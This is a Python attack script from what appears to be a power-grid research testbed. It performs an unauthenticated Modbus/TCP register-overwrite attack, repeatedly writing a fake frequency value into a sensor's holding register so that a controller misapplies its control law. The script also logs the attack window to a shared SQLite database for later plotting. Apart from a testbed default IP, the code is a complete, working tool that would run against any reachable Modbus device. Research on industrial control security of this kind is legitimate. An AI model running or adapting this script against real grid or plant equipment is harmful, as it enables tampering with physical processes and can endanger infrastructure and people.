"""
attacks/spoof.py — Unauthenticated Modbus Register Overwrite (Value-Spoofing) Attack

Mechanism
---------
Runs a standard Modbus/TCP client from the attacker host and issues
WRITE_SINGLE_REGISTER (FC 6) requests directly to the sensor's frequency
holding register (HR 0), overwriting it with an attacker-chosen fake value
for the duration of a configured attack window.

No traffic interception, ARP spoofing, or packet crafting is required.
The sensor's Modbus/TCP server accepts the write because Modbus/TCP defines
no authentication mechanism — any reachable host is implicitly an authorised
writer. The controller subsequently reads the spoofed value and misapplies its
control law.

Academic framing (for writeup)
-------------------------------
The attacker issues a legitimate Modbus WRITE_SINGLE_REGISTER request —
identical in structure to the sensor's own writes — from an unauthorised host.
Because Modbus/TCP carries no challenge-response, session token, or source-IP
allowlist, the server accepts it. The vulnerability demonstrated is the absent
authentication gate, not any network-layer exploit. This matches documented
ICS risks (e.g. ICS-CERT ICSA-advisories on Modbus authentication absence,
NISTIR 7628 §2.3).

Attack window coordination
--------------------------
Writes ATTACK_ACTIVE = '1' to the shared SQLite state database at window open
and '0' at window close. physics.py reads this tag each timestep and forwards
it to logger.py → CSV column `attack_active`. plots.py renders the window as
a red-shaded region automatically.

Usage (from attacker host via run_spoof.py):
    python attacks/spoof.py \\
        --sensor-ip  192.168.1.10 \\
        --fake-freq  48.5 \\
        --attack-start   60 \\
        --attack-duration 120 \\
        [--db-path powergrid_db.sqlite] \\
        [--scale-factor 100] \\
        [--period 0.1]
"""

import sys
import os
import time
import argparse
import sqlite3

# pymodbus ≥3.0 restructured the client module; fall back to 2.x path
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient

MODBUS_PORT = 502
FREQ_REGISTER = 0   # Holding Register 0 = grid frequency (scaled × 100)


# ──────────────────────────────────────────────────────────────────────────────
# Shared-state helper
# ──────────────────────────────────────────────────────────────────────────────

def _set_attack_flag(db_path: str, value: str) -> None:
    """Write ATTACK_ACTIVE tag directly to the shared SQLite state DB.

    physics.py polls this tag every timestep, so the CSV column
    `attack_active` reflects the ground-truth attack window without any
    modifications to physics.py or logger.py.
    """
    try:
        conn = sqlite3.connect(db_path, timeout=5)
        conn.execute(
            "UPDATE powergrid SET value=? WHERE name='ATTACK_ACTIVE' AND pid=1",
            (value,)
        )
        conn.commit()
        conn.close()
    except Exception as exc:
        print(f"[spoof] WARNING: could not update ATTACK_ACTIVE flag: {exc}",
              file=sys.stderr)


# ──────────────────────────────────────────────────────────────────────────────
# Attack logic
# ──────────────────────────────────────────────────────────────────────────────

def run_spoof(
    sensor_ip: str,
    fake_freq: float,
    attack_start: float,
    attack_duration: float,
    db_path: str,
    scale_factor: float,
    period: float,
) -> None:
    """Main entry point: sleep → connect → overwrite HR 0 → cleanup."""

    fake_scaled = int(round(fake_freq * scale_factor))
    attack_end = attack_start + attack_duration

    print(f"[spoof] ── Configuration ─────────────────────────────────────")
    print(f"[spoof]   Target sensor : {sensor_ip}:{MODBUS_PORT}")
    print(f"[spoof]   Fake frequency: {fake_freq:.3f} Hz  (Modbus int: {fake_scaled})")
    print(f"[spoof]   Attack window : t={attack_start:.1f}s → t={attack_end:.1f}s  "
          f"(duration {attack_duration:.0f}s)")
    print(f"[spoof]   Write period  : {period:.3f}s")
    print(f"[spoof]   State DB      : {db_path}")
    print(f"[spoof] ─────────────────────────────────────────────────────")

    # ── Pre-attack sleep ─────────────────────────────────────────────────────
    t0 = time.monotonic()
    wait = attack_start - (time.monotonic() - t0)
    if wait > 0:
        print(f"[spoof] Waiting {wait:.1f}s before attack window opens...")
        time.sleep(wait)

    # ── Connect Modbus client ────────────────────────────────────────────────
    client = ModbusTcpClient(host=sensor_ip, port=MODBUS_PORT)
    if not client.connect():
        print(f"[spoof] ERROR: Modbus connection to {sensor_ip}:{MODBUS_PORT} failed.",
              file=sys.stderr)
        sys.exit(1)
    print(f"[spoof] Connected to Modbus server at {sensor_ip}:{MODBUS_PORT}.")
    print(f"[spoof] Beginning register overwrite loop...")

    # ── Attack window ────────────────────────────────────────────────────────
    _set_attack_flag(db_path, '1')
    print(f"[spoof] ATTACK_ACTIVE = True  ← attack window open")

    window_start = time.monotonic()
    writes_ok = 0
    writes_fail = 0
    try:
        while (time.monotonic() - window_start) < attack_duration:
            loop_t = time.monotonic()
            try:
                rr = client.write_register(FREQ_REGISTER, fake_scaled)
                if rr and hasattr(rr, 'isError') and rr.isError():
                    print(f"[spoof] write_register returned error: {rr}")
                    writes_fail += 1
                else:
                    writes_ok += 1
            except Exception as exc:
                writes_fail += 1
                print(f"[spoof] Write exception (transient): {exc}", file=sys.stderr)

            # Pace writes to match sensor update rate
            elapsed = time.monotonic() - loop_t
            sleep_t = period - elapsed
            if sleep_t > 0:
                time.sleep(sleep_t)

    finally:
        # ── Cleanup ──────────────────────────────────────────────────────────
        client.close()
        _set_attack_flag(db_path, '0')
        print(f"[spoof] ATTACK_ACTIVE = False ← attack window closed")
        print(f"[spoof] Stats: {writes_ok} successful writes, {writes_fail} failed writes")


# ──────────────────────────────────────────────────────────────────────────────
# CLI entrypoint
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Modbus register-overwrite (spoof) attack — Power Grid CPS Testbed Phase 3',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('--sensor-ip',
                        default='192.168.1.10',
                        help='Sensor Modbus/TCP server IP address')
    parser.add_argument('--fake-freq',
                        type=float, default=48.5,
                        help='Fake frequency value to inject into HR 0 (Hz)')
    parser.add_argument('--attack-start',
                        type=float, default=60.0,
                        help='Seconds after script launch to open the attack window')
    parser.add_argument('--attack-duration',
                        type=float, default=120.0,
                        help='Duration of the active attack window (s)')
    parser.add_argument('--db-path',
                        default='powergrid_db.sqlite',
                        help='Path to shared SQLite state database')
    parser.add_argument('--scale-factor',
                        type=float, default=100.0,
                        help='Modbus integer scaling factor (Hz × scale → register int)')
    parser.add_argument('--period',
                        type=float, default=0.1,
                        help='Write interval during attack window (s)')
    args = parser.parse_args()

    run_spoof(
        sensor_ip=args.sensor_ip,
        fake_freq=args.fake_freq,
        attack_start=args.attack_start,
        attack_duration=args.attack_duration,
        db_path=args.db_path,
        scale_factor=args.scale_factor,
        period=args.period,
    )
